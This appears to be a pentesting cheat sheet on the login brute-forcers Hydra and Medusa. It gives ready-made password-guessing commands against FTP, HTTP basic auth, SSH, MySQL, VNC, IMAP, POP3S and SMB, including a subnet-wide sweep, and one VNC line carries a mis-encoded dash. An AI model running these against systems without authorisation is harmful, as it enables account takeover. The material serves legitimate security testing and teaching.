## Hydra

[Hydra](https://github.com/vanhauser-thc/thc-hydra) is a very fast and flexible login cracker that supports many different protocols. It can be used to perform brute-force attacks against various services, including HTTP, FTP, SSH, and more.

```bash
hydra -l user -P /tmp/wordlists/passwords/password.txt ftp://192.168.0.1
```

You can also use the `-t` flag to define the number of connects in parallel per target which is defaulted to 16, or use the `-m` flag for more options specific to each module.
The uppercase flags are to be used when you want to use a list (when you don't know this credential), and the lowercase when you know this login information.

- Basic HTTP auth :

```bash
hydra -L /tmp/wordlists/usernames/http_default_users.txt -P /tmp/wordlists/passwords/password.txt -u -f TARGET_IP -s PORT http-get /
```

- SSH :

```bash
hydra -l alice -P /tmp/wordlists/passwords/password.txt -u -f ssh://TARGET_IP:PORT -t 4
```

- MySQL :

```bash
hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -P /tmp/wordlists/passwords/password.txt -f mysql://TARGET_IP -V
```

- VNC :

```bash
hydra -l bob â€“P /tmp/wordlists/passwords/password.txt -s PORT TARGET_IP vnc
```

- Other examples :

```bash
  hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -P /tmp/wordlists/passwords/password.txt -M targets.txt ssh
```

## Medusa

[Medusa](https://github.com/jmk-foofus/medusa) is a speedy, parallel, and modular, login brute-forcer.
There are many other modules that are supported such as :

- CVS
- FTP
- HTTP
- RLOGIN
- SSHv2

To display them, simply use this command :

```bash
medusa -d
```

And to get specific options for a given module :

```bash
medusa -M smbnt -q
```

The following command instructs Medusa to test all passwords listed in passwords.txt against a single user (administrator) on the host 192.168.0.20 via the SMB service. The "-e ns" instructs Medusa to additionally check if the administrator account has either a blank password or has its password set to match its username (administrator).

```bash
medusa -h 192.168.0.20 -u administrator -P /tmp/wordlists/passwords/password.txt -e ns -M smbnt
```
